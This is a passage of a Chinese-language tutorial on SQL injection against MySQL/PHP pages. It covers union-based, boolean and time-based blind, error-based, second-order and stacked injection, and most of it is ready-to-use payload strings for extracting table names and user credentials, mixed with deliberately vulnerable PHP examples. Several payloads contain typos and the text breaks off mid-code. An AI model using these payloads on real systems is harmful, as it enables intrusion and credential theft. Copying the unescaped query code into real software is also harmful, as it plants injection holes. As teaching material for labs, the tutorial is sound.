$query="select * from AgentJudge where userAgent='{$userAgent}'";
$result=mysqli_query($link,$query);
if (mysqli_num_rows($result)!=0){
    print('请不要恶意浏览本网页');
}</code></pre>
<p><strong>可以看到后端代码中并没有对user-agent字段做过滤，那么我们就可以直接开始构造注入语句</strong></p>
<h2 id="0x04-按照有无回显分">0x04 按照有无回显分</h2>
<h3 id="41-注入步骤">4.1 注入步骤</h3>
<p><strong>判断注入点是否存在</strong></p>
<p>首先我们需要判断注入点是否存在，如果在页面的url中存在某些参数，比如下面这个URL中就存在一个id参数：<a target="_blank" rel="noopener" href="http://xxxxx.xxx/?id=1">http://xxxxx.xxx/?id=1</a></p>
<p>我们就可以尝试改变id的数值，将参数值+1或-1，然后查看页面展示的内容是否会变化，如果页面会发生变化，则我们就可以初步判断，这个id会带入数据库查询，查询后的内容会显示到页面中来。</p>
<p>猜测查询的SQL语句大致为：</p>
<p>select * from [表名] where id = 1;</p>
<p>常见注入点:</p>
<pre><code class="hljs plaintext">1.GET/POST/PUT/DELETE参数
2.X-Forwarded-For
3.文件名</code></pre>
<p>接下来我们就可以进行测试，看看我们传入的参数是否会被带入数据库查询，测试的方法如下：(这里也称为sql脱库即拿出数据库里面的数据)</p>
<pre><code class="hljs plaintext">添加单引号

添加了单引号之后，如果页面中直接进行了报错，并且报错的信息显示到了页面中来，说明我们输入的单引号被带入了数据库查询，我们就可以直接判断此处存在sql注入漏洞。并且结合之前判断的页面是否有回显，就可以尝试进行联合查询注入或是报错注入。

添加逻辑运算

添加[and 1 = 1]和[and 1 = 2]

在添加逻辑运算之前我们需要判断或者猜测注入点的数据类型和闭合方式，并对语句进行相应的引号、括号闭合。

比如字符型我们可以直接添加and 1=1 ，而单验号闭合的字符型我们就需要添加 'and '1'=1 ，或 'and '1'=1' # 使用注释符号将后面的引号直接注释掉。

添加了逻辑运算符之后提交，因为1=1恒为真，而1=2恒为假，所以如果我们的输入带入了数据库，一定会影响到SQL语句的布尔状态，如果两次查询返回的页面不同，说明页面存在布尔状态，此处存在注入漏洞，可以考虑使用布尔盲注进行注入。

添加sleep( )函数

sleep()函数可以让程序在当前位置停留指定的时间，于是我们可以通过观察页面相应的时间来判断我们插入的参数是否会被带入数据库执行。

在参数后添加 and sleep(5) 然后观察页面响应时间是否明显变长，或直接在开发者工具中网络选项卡下观察页面的响应时间。如果页面响应时间确实按照我们的要求增加了5秒，则说明此处存在注入漏洞，我们可以考虑通过延时注入。</code></pre>
<p>在这里我们需要知道，我们构建union select语句时，当前面的查询语句为假，也就是数据不存在时，union select之后查询出的结果就会显示在页面中。这里我们可以通过在前面查询语句中添加 and 1=2 使语句变假，也可以直接将id传入一个负数，来使语句变假。</p>
<p><strong>STEP1：判断闭合符</strong><br>
<strong>STEP2：判断列数</strong><br>
<strong>联合查询会将两条查询语句的查询结果拼接到一起返回！于是反映出联合查询需遵守的一个规则便是，两条查询语句的查询字段数必须相等，于是乎在利用联合查询进行注入的时候，我们第一步要做的就是判断判断后端代码中的SQL查询语句的字段数。</strong></p>
<pre><code class="hljs plaintext">select id,username,passwd from t_user order by 4;</code></pre>
<pre><code class="hljs plaintext">order by +数字     
通过页面状态查看有几列然后通过union select 判断回显位（注意判断回显位的时候，前面查询的值要为假，不然回显位会被前面查询的结果所占用，导致看不到回显位）

靶场经验（如果order by被过滤了，可以通过 group by 来判断，或者 union select 1,2,3,4,5,6, 这两的列数查询判断网页状态）</code></pre>
<p><strong>STEP 3：查数据库名</strong></p>
<pre><code class="hljs plaintext">注意：（union  和union all 的区别   union all 显示重复的值，而union不显示重复的值，当union select 用不了的时候可以通过union all 来查询）</code></pre>
<pre><code class="hljs plaintext">?id=-1 union select 1,database(),1--+</code></pre>
<p>​     <strong>注意id=-1,此处id的值必须是一个在数据库中id字段不存在的值，否则联合查询第一条语句的查询结果将占据显示位，我们需要的第二条查询语句的查询结果就不能正常显示到浏览器中。</strong><br>
<strong>STEP 4：查表名</strong><br>
​      <strong>假如上一步查询出来的数据库名为security</strong></p>
<pre><code class="hljs plaintext">?id=-1' union select 1,group_concat(table_name),1 from information_schema.tables where table_schem='security'--+</code></pre>
<p>注意第二条查询语句我们payload插入位置的字段一定要在前端有回显，否则我们将不能查看到查询结果。<br>
<strong>STEP 5：查列名</strong><br>
假如上一步查询出来的表名中有user表</p>
<pre><code class="hljs plaintext">?id=-1' union select 1,group_concat(column_name),1 from information_schema.columns where table_schema=database() and table_name='user'--+</code></pre>
<p><strong>STEP 6：查数据</strong><br>
假如上一步查询出来的字段有username与password</p>
<pre><code class="hljs plaintext">?id=-1' and select 1,group_concat(concat(0x7e,username,0x7e,passwd,0x7e)),1 from user--+</code></pre>
<h3 id="42-有回显">4.2 有回显</h3>
<h4 id="421-联合查询注入">4.2.1 联合查询注入</h4>
<pre><code class="hljs plaintext">information_schema库简介
   information_schema库是mySQL自带的一个库，其中包含了当前数据库管理系统的所有信息，但该数据库并不是一个实体的数据库，它不存储任何实际意义上的数据，它只是整个数据库管理系统的一个视图，当某个数据库的某个表发生变化时，information_schema库中相关的数据将同时发生变化。
    在注入中，我们关注的是该库中的schemata、tables、columns三个表。他们分别存储了整个数据库管理系统的所有数据库信息，表信息，字段信息。在schemata表中，通过schema_name字段可以获取所有的数据库名；在tables,通过table_name、table_schema字段可以获取所有的表名与其对应的数据库名；在columns表中，通过columns、table_name、table_schema字段可以获取所有的字段名以及其所属表与数据库。
   我们的注入思路就是先通过mysql的内建函数database(),获取当前数据库名，再通过tables表获取，所有的表信息，再通过columns表获取上述表所有的字段，最后通过字段查询想要的数据。
当然使用information_schema库查询信息有一个很重要的条件限制，那就是，需要当前连接数据库的用户具有读该数据库的权限，</code></pre>
<p><strong>应用场景</strong></p>
<pre><code class="hljs plaintext">UNION连续的几个查询的字段数一样且列的数据类型转换相同，就可以查询数据；
注入点有回显；
只有最后一个SELECT子句允许有ORDER BY；只有最后一个SELECT子句允许有LIMIT。
UNION注入的流程

graph LR
A[order by确定列数] --&gt; B["查看返回点,选取可以显示数据的位置"]
B --&gt; C["读库、读表、读数据(可执行任意语句)"]

注意:
为什么 order by 能确定列数？order by 的作用为根据一列或者多列的值，按照升序或者降序排列数据，当超出表的列数时发生报错。

为什么需要确定列数？UNION 内部的 SELECT 语句必须拥有相同的列（可用二分快速查找）</code></pre>
<h4 id="422-盲注">4.2.2 盲注</h4>
<p>盲注又分为布尔盲注与时间盲注两种类型</p>
<h5 id="布尔盲注">布尔盲注</h5>
<p>基本原理是：通过控制通过and连接起来的子句的布尔值，来控制页面的显示结果来判断and后子句的真实性,bool盲注适用于bool判断的结果能够回显在界面内容中的情况，例如界面文本的变化。举个例子</p>
<pre><code class="hljs plaintext">?id=1' and substring(database(),1,1)='s'--+</code></pre>
<p>根据and的特性，当and运算符左边的计算结果为真时会继续判断后边的运算结果，如果右边的结果也为真则整个语句为真，当右边的语句为假时，则整个语句为假；当and左边的运算结果为假时，则直接判断整个语句为假，举例如下</p>
<pre><code class="hljs plaintext">1==1 and 1==2 //false 1==1为true,继续判断1==2的结果为false，整体为false

1==1 and 2==2 //true 1==1为true,继续判断2==2的结果为true，整体为true

1==2 and 1==1 //false 1==2为flse,直接判断整体为false，不再对右边的内容进行判断

1==2 and 1==2 //fale 1==2为flse,直接判断整体为false，不再对右边的内容进行判断</code></pre>
<p>​      利用and的这个特性，id=1恒为真的时候，and右边substring子句的执行结果将直接影响这个SQL查询语句的结果，即substring子句为真，整个查询语句为真，页面正常回显内容，当substring子句为假的时候，整个查询语句为假，页面不正常回显内容。<br>
​       在上面我们构造的查询语句中，对数据库名的第一个字段进行了判断，假如判断正确，那么接着对第二个字符进行判断</p>
<pre><code class="hljs plaintext">?id=1' and substring(database(),1,2)='se'--+</code></pre>
<p>​       直到数据库名的最后一个字符被找出来。可以看到这个过程耗时耗力，我们要对所有可能的大小写字母、数字、特殊字符进行枚举，所以可以考虑透过自动化脚本的方式来进行判断。这里对脚本的编写推荐适用python语言，其request可以很方便的构造请求。<br>
​       要获取表名、字段名、数据，只需将上述database()替换为对应payload即可，如要获取表名</p>
<pre><code class="hljs php"><span class="hljs-number">1</span><span class="hljs-string">' or length((select database()))=8#    //判断数据库名字长度</span>
<span class="hljs-string"></span>
<span class="hljs-string">1'</span> <span class="hljs-keyword">or</span> <span class="hljs-title function_ invoke__">ascii</span>(<span class="hljs-title function_ invoke__">substr</span>((select <span class="hljs-title function_ invoke__">database</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">115</span><span class="hljs-comment"># //判断数据库名</span>

<span class="hljs-number">1</span><span class="hljs-string">' or (select count(table_name) from information_schema.tables where table_schema=database())=4#  //判断表的个数</span>
<span class="hljs-string"></span>
<span class="hljs-string">1'</span> <span class="hljs-keyword">or</span> <span class="hljs-title function_ invoke__">ascii</span>(<span class="hljs-title function_ invoke__">substr</span>((select table_name <span class="hljs-keyword">from</span> information_schema.tables where table_schema=<span class="hljs-title function_ invoke__">database</span>() limit <span class="hljs-number">3</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">117</span><span class="hljs-comment"># //判断表的名字</span>

<span class="hljs-number">1</span><span class="hljs-string">' or (select count(column_name) from information_schema.columns where table_name='</span>users<span class="hljs-string">')=14# //判断列的个数</span>
<span class="hljs-string"></span>
<span class="hljs-string">1'</span> <span class="hljs-keyword">or</span> <span class="hljs-title function_ invoke__">ascii</span>(<span class="hljs-title function_ invoke__">substr</span>((select column_name <span class="hljs-keyword">from</span> information_schema.columns where table_name=<span class="hljs-string">'users'</span> limit <span class="hljs-number">12</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">117</span><span class="hljs-comment"># //判断列的名字</span>

<span class="hljs-number">1</span><span class="hljs-string">' or (select count(username) from users)=13#  //判断用户名和密码的个数</span>
<span class="hljs-string"></span>
<span class="hljs-string">1'</span> <span class="hljs-keyword">or</span> <span class="hljs-title function_ invoke__">ascii</span>(<span class="hljs-title function_ invoke__">substr</span>((select username <span class="hljs-keyword">from</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">68</span><span class="hljs-comment"># //判断用户名和密码</span>

<span class="hljs-comment">//or当然在不对 1 进行判断的情况下可以换为and</span></code></pre>
<h5 id="时间盲注">时间盲注</h5>
<p>​        时间盲注与布尔盲注有异曲同工之妙，只不过判断语句正确与否的标志不再是查询结果有没有被正确得回显，而是网页的响应时间。看下面语句:</p>
<pre><code class="hljs plaintext">?id=1' and if (length(database())&lt;20,sleep(5),1)--+</code></pre>
<p>​         上例中，通过length函数获取了当前数据库的长度并与20进行比较，如果数据库名长度小于20，那么则延时5秒向后端脚本程序回显查询结果，如果数据库名不小于20，则直接回显结果。延时5秒的结果表现在客户端就是当前浏览器tab的标题部分会一直转圈圈。然后通过二分法。即将上述语句中的20改为10继续测试，如果不小于10，则在将10修改为15，按照此规律我们逐渐紧逼找到当前数据库名的真正长度。数据库名的长度确认之后，我们就要开始获取数据库名的值了：</p>
<pre><code class="hljs plaintext">?id=1' and if (substring(database(),1,1)='s',sleep(5),1)--+</code></pre>
<p>​       通过上述布尔盲注中讲到的方法，最终获取到数据库名。当然上面的语句我们还有其他的变种，如：</p>
<pre><code class="hljs plaintext">?id=1' and if (ascii(substring(database(),1,1))=67,sleep(5),1)--+ //通过ascii码来比较

?id=1' and if (hex(substring(database(),1,1))=FF,sleep(5),1)--+ //通过十六进制值来比较

?id=1' and if (mid(database(),1,1)='s',sleep(5),1)--+ //使用mid函数代替substring

?id=1' and if (substr(database(),1,1)='s',sleep(5),1)--+ //和substring是等效的

?id=1' and if (left(database(),2)='se',sleep(5),1)--+ //截取左边两个个字符

?id=1' and if (right(database(),2)='ty',sleep(5),1)--+ //截取右边两个字符</code></pre>
<p>​        要获取表明、字段名、数据只需将上面payload中的database()替换为联合查询注入中的payload即可，如要获取表名，则构造如下语句：</p>
<pre><code class="hljs mysql">?id=1'and if(length((select database()))&gt;9,sleep(5),1)--+ //长度

?id=1'and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+//名字

?id=1' and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1))=5,sleep(5),1)--+//长度

?id=1'and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()limit 3,1),1,1))&gt;99,sleep(5),1)--+ //名字

?id=1' and if((select count(column_name) from information_schema.columns where table_name='users'),sleep(5),1)=14--+ //个数

?id=1' and if(length(substr((select column_name from information_schema.columns where table_name='users' limit 12,1),1))=8,sleep(5),1)--+ //长度

?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 12,1),1,1)),sleep(5),1)=117--+ //列名

?id=1' and if((select count(username) from users)&gt;13,sleep(5),1)--+ //多少个用户名

?id=1' and if(length(substr((select username from users limit 0,1),1))=4,sleep(5),1)--+   //用户名或者密码的长度

?id=1' and if(ascii(substr((select username from users limit 0,1),1,1))=68,sleep(5),1)--+ //每个用户名和密码的名字</code></pre>
<p><strong>1、mid()函数</strong></p>
<p>此函数为截取字符串一部分。MID(column_name,start[,length])</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:%5CUsers%5C%E4%BB%98%E6%80%9D%E9%92%A7%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230224125929435.png" alt="image-20230224125929435"></p>
<p><strong>2、substr()函数</strong></p>
<p>用法：substr(string string,num start,num length);</p>
<p>string为字符串；start为起始位置；length为长度。</p>
<p><strong>注意：mysql中的start是从1开始的。</strong></p>
<p>例：substr(database(),1,1)=‘a’</p>
<p>通过=右侧字母的改变和表达式的真假判断库名</p>
<p><strong>3、left()函数</strong></p>
<p>此函数用法：left(a,b)</p>
<p>从左侧截取 a 的前 b 位</p>
<p>例：left(database(),1)=‘a’</p>
<p>通过=右侧字母的改变和表达式的真假判断库名</p>
<h4 id="423-报错注入">4.2.3 报错注入</h4>
<p>报错注入就是利用数据库的某些正常的机制，人为得制造错误，将查询得结果携带在报错信息中回显到客户端。</p>
<pre><code class="hljs php">什么场景下有用？

查询不回现内容，但会打印错误信息
Update、Insert等语句，会打印错误信息（前面的union 不适合 update 语句）
    
这种场景的源码是怎样的?
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>)
{
    <span class="hljs-keyword">echo</span> <span class="hljs-string">'Your Login name:'</span>.roe[<span class="hljs-string">'username'</span>];
}
<span class="hljs-keyword">else</span>
{
    <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">mysql_error</span>());
}</code></pre>
<pre><code class="hljs plaintext">当执行的SQL语句出错时返回错误信息，在错误信息中返回数据库的内容，即可实现SQL注入。

那么实现SQL注入的难点就在于构造语句，制造错误，让错误中包含数据库内容。

这里介绍3个函数引起报错，其他的函数类似。

floor() select count() from information_schema.tables group by concat((select version()),floor(rand(0)2))    注: group by对rand（）函数操作时产生了错误

extractvalue() extractvalue(1,concat(0x7e，(select user()),0x7e)) 
注: xpath语法导致的错误

updatexml() select updatexml(1,concat(0x7e,(select version()),0x7e),1) 
注: xpath语法导致的错误</code></pre>
<h5 id="updatexml注入">updatexml注入</h5>
<p>​      updatexml函数接受三个参数，第一个参数是一个xml格式的字符串，第二个参数是符合xpath语法规范的字符串，第三个参数是要替换成的字符串。该函数的功能就是从第一个xml字符串中通过xpath语法选择匹配的部分替换成第三个参数的内容。并且当xpath语法出现错误的时候，将会回显数据，于是我们将我们的查询语句放到第二个参数中，作为错误回显的一部分外带到客户端浏览器。比如需要获取库名，则构造如下语句</p>
<pre><code class="hljs plaintext">?id=1' and updatexml(1,concat(0x7e,database()),1)--+ //and可以被替换为or,如果为or,则还有一处需要修改，请自行思考(我估计是改为-1即可)</code></pre>
<p>​      注意，concat是必须的，0x7e也是必须的，否则将不会回显错误信息，0x7e可以被别的十六进制数代替，但是有限制的，亲们可以自行尝试。且0x7e位置上的数字转换后必须为字符型，concat只能连接字符串，不能连接数字。获取表名、列名、数据的方法参见前文描述，这里不再赘述。</p>
<h5 id="extractvalue注入">extractvalue注入</h5>
<p>​      该函数与updatexml很像，但他只接受两个参数，且其定义与updatexml一样。</p>
<pre><code class="hljs plaintext">?id=1' and extractvalue(1,concat(0x7e,database()))--+ //and可以被替换为or,如果为or,则还有一处需要修改，请自行思考</code></pre>
<h5 id="主键重复报错">主键重复报错</h5>
<p>看下面的例子</p>
<pre><code class="hljs plaintext">?id=1' or (select 1 from (select count(*),concat(database(),floor(rand(0)*2))alias_a from information_schema.tables group by alias_a)b)--+</code></pre>
<pre><code class="hljs plaintext">group by子句能够根据一个或多个列对结果集进行分组
floor函数的功能为向下取整
rand函数将根据传入的随机数种子生成一个0-1之间的随机数，当传入的种子固定的时候，随机数的规律也就固定下来。
count为聚合函数，配合group by 子句，将对分组字段相同的值进行计数。
分析上面的例子将要达到的查询效果是：从information_schema.tables表中根据拼接字段alias_a对结果集进行计数输出。</code></pre>
<p>​           在上例中rand函数生成的随机数乘以2的范围就是0-2，那么再使用floor函数进行向下取整，其值就只能是0或者1。同时因为<strong>group by  的特性</strong>使得其在进行分组的时候会对后面的字段进行两次运算，group by  在进行分组的时候，会生成一张虚拟表记录数据，那么假设一种情况，当group  by进行第一次运算的时候，发现虚拟表中没有相同的数据，准备进行插入操作，但因为rand函数的随机性，导致在第二次运算的时候产生的结果在虚拟表中已经存在，那么在插入该数据的时候就会产生主键冲突，从而产生报错信息，将我们需要的数据通过报错信息外带。<br>
​     下例是查询数据库的payload，查询表名的方法如下，其他信息的查询方法请自行思考</p>
<pre><code class="hljs plaintext">?id=1' or (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1),floor(rand(0)*2))alias_a from information_schema.tables group by alias_a)b)--+</code></pre>
<p>可以总结出来一个模板</p>
<pre><code class="hljs plaintext">?id=1' or (select 1 from (select count(*),concat((payload),floor(rand(0)*2)) from information_schema.tables group by alias_a)b)--+</code></pre>
<p>​     只需将上面模板中的内容替换成为我们的查询payload即可,alias_a与b均是字段别名</p>
<h5 id="几何函数注入">几何函数注入</h5>
<p>可以使用的几何函数</p>
<pre><code class="hljs plaintext">geometrycollection:存储任意集合图形的集合
multipoint:存储多个点
polygon:多边形
multipolygon:多个多边形
linstring：线
multilinestring：多条线
point：点</code></pre>
<p>payload:</p>
<pre><code class="hljs plaintext">select * from  test where id=1 and mutilinestring((select*from(select * from (select user())a)b)))    //构造语法都是这样。
GeometryCollection((select * from (select * from(select user())a)b))

polygon((select * from(select * from(select user())a)b))

multipoint((select * from(select * from(select user())a)b))

multilinestring((select * from(select * from(select user())a)b))

LINESTRING((select * from(select * from(select user())a)b))

multipolygon((select * from(select * from(select user())a)b))</code></pre>
<p>只要上述函数中的参数不是集合形状数据，就会报错。有mysql版本限制。以上列表中基于geometric(集合函数)的报错注入在这个 <a target="_blank" rel="noopener" href="https://github.com/mysql/mysql-server/commit/5caea4a995130cd7c82574acc591ff7c46d9d978">commit 5caea4</a> 中被修复，在5.5.x较后的版本中同样不再生效。</p>
<h5 id="基于溢出的注入">基于溢出的注入</h5>
<p>~：按位取反（得到数据的二进制后，按位取反）<br>
exp(3)：自然对数的3次方，很容易就溢出了</p>
<pre><code class="hljs plaintext">select * from mysql.user where id=1 and exp(~(select * from (select user())a));</code></pre>
<p>~后的内容被取反后会得到一个很大的数，再做为自然对数的指数，得到的值一定会溢出，从而报错将查询结果显示出来.</p>
<p>基于exp函数的报错注入在MySQL 5.5.49后的版本已经不再生效，具体可以参考这个 <a target="_blank" rel="noopener" href="https://github.com/mysql/mysql-server/commit/95825fa28a7e84a2f5dbdef5241078f7055c5b04">commit 95825f</a> 。</p>
<h4 id="424-二次注入二阶注入">4.2.4 二次注入(二阶注入)</h4>
<p>二阶注入是指已存在的用户输入的数据被存储到数据库中，在用户再次使用该数据的时候导致的注入，这种注入类型是很难通过工具扫描或者黑盒测试发现的，往往需要通过白盒测试才能发现。比如现在有一个网站提供了用户注册与修改密码的功能。在用户登录的时候，通过函数对用户的输入进行了转义，如</p>
<pre><code class="hljs plaintext">专有名词：

白盒测试也称为结构测试，主要用于检测软件编码过程中的错误。程序员的编程经验、对编程软件的掌握程度、工作状态等因素都会影响到编程质量，导致代码错误。

黑盒测试又称为功能测试，主要检测软件的每一个功能是否能够正常使用。在测试过程中，将程序看成不能打开的黑盒子，不考虑程序内部结构和特性的基础上通过程序接口进行测试，检查程序功能是否按照设计需求以及说明书的规定能够正常打开使用。</code></pre>
<pre><code class="hljs php"><span class="hljs-variable">$link</span> = @<span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-variable">$host</span>,<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>,<span class="hljs-variable">$dbname</span>,<span class="hljs-variable">$port</span>);
<span class="hljs-variable">$username</span>=<span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'username'</span>]);
<span class="hljs-variable">$passwd</span>=<span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'passwd'</span>]);
<span class="hljs-variable">$repasswd</span>=<span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'repasswd'</span>]);
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$passwd</span>==<span class="hljs-variable">$repasswd</span>){
    <span class="hljs-variable">$query</span>=<span class="hljs-string">"select * from t_user where username='<span class="hljs-subst">{$username}</span>' and passwd=='<span class="hljs-subst">{$passwd}</span>'"</span>;
    <span class="hljs-variable">$res</span>=@<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$link</span>,<span class="hljs-variable">$query</span>);
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_num_rows</span>(<span class="hljs-variable">$res</span>)==<span class="hljs-number">1</span>){
        <span class="hljs-comment">//登录成功</span>
    }<span class="hljs-keyword">else</span>{
        <span class="hljs-keyword">die</span>(<span class="hljs-string">'用户名或密码错误'</span>)
    }
}<span class="hljs-keyword">else</span>{
    <span class="hljs-keyword">die</span>(<span class="hljs-string">"两次输入密码不一致"</span>)
}</code></pre>
<p>可以看到在登录界面，用户名与密码被mysql_real_escape_string函数做了转义，那么我们输入的单引号或者双引号就失去了作用，于是我们不能通过简单一次注入获取数据。再看用户注册界面的代码</p>
<pre><code class="hljs php"><span class="hljs-variable">$link</span> = @<span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-variable">$host</span>,<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>,<span class="hljs-variable">$dbname</span>,<span class="hljs-variable">$port</span>);
<span class="hljs-variable">$username</span>=<span class="hljs-title function_ invoke__">mysql_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'username'</span>]);
<span class="hljs-variable">$passwd</span>=<span class="hljs-title function_ invoke__">mysql_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'passwd'</span>]);
<span class="hljs-variable">$repasswd</span>=<span class="hljs-title function_ invoke__">mysql_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'repasswd'</span>]);
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$passwd</span>==<span class="hljs-variable">$repasswd</span>){
    <span class="hljs-variable">$query</span>=<span class="hljs-string">"select * from t_user where username='<span class="hljs-subst">{$username}</span>'"</span>;
    <span class="hljs-variable">$res</span>=@<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$link</span>,<span class="hljs-variable">$query</span>);
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_num_rows</span>(<span class="hljs-variable">$res</span>)!=<span class="hljs-number">0</span>){
        <span class="hljs-comment">//当前用户已存在</span>
    }<span class="hljs-keyword">else</span>{
        <span class="hljs-variable">$query</span>=<span class="hljs-string">"insert into user values ('<span class="hljs-subst">{$username}</span>','<span class="hljs-subst">{$passwd}</span>')"</span>;
        <span class="hljs-variable">$res</span>=@<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$link</span>,<span class="hljs-variable">$query</span>);
        <span class="hljs-keyword">if</span> (mysqli_affected_rows=<span class="hljs-number">1</span>){
            <span class="hljs-comment">//新增用户成功</span>
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-comment">//未知错误，请检查后再输入</span>
        }
    }
}<span class="hljs-keyword">else</span>{
    <span class="hljs-keyword">die</span>(<span class="hljs-string">"两次输入密码不一致"</span>);
}</code></pre>
<p>可以看到注册界面的输入也被转义了，但是有一点，需要明确的是，经过msql_real_escape_string和addsashes转义的字符在插入到数据库中之后，会被解转义，不然我们注册的用户名就变了。利用这个特性我们就可以搞事情了。在用户修改密码时由这样的语句</p>
<pre><code class="hljs php"><span class="hljs-variable">$link</span> = @<span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-variable">$host</span>,<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>,<span class="hljs-variable">$dbname</span>,<span class="hljs-variable">$port</span>);
<span class="hljs-variable">$username</span>=<span class="hljs-title function_ invoke__">mysql_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'username'</span>]);
<span class="hljs-variable">$oldpasswd</span>=<span class="hljs-title function_ invoke__">mysql_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'oldpasswd'</span>]);
<span class="hljs-variable">$newpasswd</span>=<span class="hljs-title function_ invoke__">mysql_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'newpasswd'</span>]);
<span class="hljs-variable">$repasswd</span>=<span class="hljs-title function_ invoke__">mysql_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'repasswd'</span>]);
<span class="hljs-comment">//首先判断用户名密码是否正确</span>
<span class="hljs-variable">$query</span>=<span class="hljs-string">"select * from t_user where username='<span class="hljs-subst">{$username}</span>' and passwd='<span class="hljs-subst">{$oldpasswd}</span>'"</span>;
<span class="hljs-variable">$res</span>=@<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$link</span>,<span class="hljs-variable">$query</span>);
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$newpasswd</span>==<span class="hljs-variable">$repasswd</span> &amp;&amp; <span class="hljs-title function_ invoke__">mysqli_num_rows</span>(<span class="hljs-variable">$res</span>)!=<span class="hljs-number">0</span>){
    <span class="hljs-variable">$query</span>=<span class="hljs-string">"update t_user set passwd='<span class="hljs-subst">{$newpasswd}</span>' where username='<span class="hljs-subst">{$username}</span>'"</span>;
    <span class="hljs-variable">$res</span>=@<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$link</span>,<span class="hljs-variable">$query</span>);
        <span class="hljs-keyword">if</span> (mysqli_affected_rows=<span class="hljs-number">1</span>){
            <span class="hljs-comment">//密码修改成功</span>
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-comment">//未知错误，请检查后再输入</span>
        }
}<span class="hljs-keyword">else</span>{
    <span class="hljs-keyword">die</span>(<span class="hljs-string">"两次输入密码不一致或者用户名或者老密码输入错误"</span>);
}</code></pre>
<p>假如我们知道有一个用户名为admin的管理员账户，那么我们首先可以注册一个admin’#的账号，’#根据实际情况确定，密码为123456，然后我们正常登录到我们新注册的账号，跳转到修改密码的界面，然后输入用户名与密码之后点击确认，这时候后台的update语句变成了</p>
<pre><code class="hljs php"><span class="hljs-variable">$query</span>=<span class="hljs-string">"update t_user set passwd=654321 where username='admin'#'"</span>;</code></pre>
<p>所以这时候就修改了账户名为admin的密码，这时候我们就可以用我们的新密码直接登录管理员账户admin了。大家可以到sqli_labs靶场第24关进行试验。</p>
<h4 id="425-堆叠注入">4.2.5 堆叠注入</h4>
<p>mysqli_multi_query()函数：</p>
<p>Stackedinjections:堆叠注入。从名词的含义就可以看到应该是一堆sql语句（多条）一起执行。而在真实的运用中也是这样的，我们知道在mysql中，主要是命令行中，每一条语句结尾加 ; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做堆叠注入</p>
<p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql 语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而  unioninjection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union  all执行的<strong>语句类型是有限的</strong>，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。</p>
<p>使用条件</p>
<p>mysqli_multi_query（）执行多条查询的函数——防止注入改成mysqli_query()函数</p>
<p>堆叠注入的使用条件十分有限，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用**mysqli_multi_query()**函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_  query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。</p>
<p>我们就可以在普通注入的后面，写上一条任意的SQL语句，例如插入数据，或者删库。</p>
<pre><code class="hljs php">?id=-<span class="hljs-number">1</span><span class="hljs-string">' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</span>
<span class="hljs-string"></span>
